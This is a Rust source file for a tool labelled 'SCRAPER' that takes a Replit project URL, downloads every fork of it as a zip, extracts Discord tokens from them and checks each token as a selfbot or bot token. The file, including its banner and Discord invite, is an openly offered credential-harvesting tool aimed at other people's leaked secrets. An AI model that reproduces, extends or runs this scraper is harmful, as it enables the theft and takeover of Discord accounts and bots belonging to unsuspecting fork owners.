use reqwest::Client;
mod repl;
use repl::Replit;
use std::sync::Arc;
use futures::{stream::futures_unordered::FuturesUnordered, StreamExt};
use std::io;

#[tokio::main()]
async fn main() {
    if cfg!(target_os = "windows") {
        std::process::Command::new("cmd").arg("/C").arg("cls");
    }

    println!("\x1b[0;31m

    ╔═════════════╬══════════════╗
    ║ █▀ █▀▀ █▀█ ▄▀█ █▀█ █▀▀ █▀█ ║
    ║ ▄█ █▄▄ █▀▄ █▀█ █▀▀ ██▄ █▀▄ ║
    ╚═════════════╬══════════════╝
     ╔════════════╬═════════════╗
     ║       MADE BY SHELL      ║
     ╚══════════════════════════╝
    \x1b[0m");
    println!("\x1b[0;31mView https://github.com/Shell1010 for any future projects.
Join our Discord Server for Help & Support + Announcements regarding future projects
https://discord.gg/qCJwVERPRV\x1b[0m");
    println!("\x1b[0;32mExample URL: /@templates/Discord-Bot-Starter\x1b[0m");
    println!("\x1b[0;32mPlease input the URL to the repl: [>]\x1b[0m");
    let mut url = String::new();
    io::stdin()
    .read_line(&mut url)
    .expect("Failed to read line");

    let repl = Replit::new(url.trim());
    let id = repl.get_id().await;

    let (urls, _ids) = repl.get_forks(&id).await;
    let client = Arc::new(Client::new());
    let mut futs = FuturesUnordered::new();
    let mut count = 1;
    for url in urls.iter() {
        let rep = repl.clone();
        futs.push(rep.get_zip(client.clone(), url.clone(), count));
        count += 1;
    };
    let mut zips = Vec::new();


    while let Some(val) = futs.next().await {
        match val {
            Some(val) => zips.push(val),
            None => (),
        }
    }
    let mut tokens: Vec<String> = Vec::new();
    for zip in zips {
        let mut token = repl.search_extract(zip).await;
        tokens.append(&mut token);
    }
    // Check selfbot tokens
    let mut futs = FuturesUnordered::new();
    for token in tokens.clone() {
        futs.push(repl.self_check_tokens(client.clone(), token.clone()));
    }
    while let Some(_) = futs.next().await {}
    let mut futs = FuturesUnordered::new();
    for token in tokens {
        futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
    }
    while let Some(_) = futs.next().await {}
    println!("Finished");
}




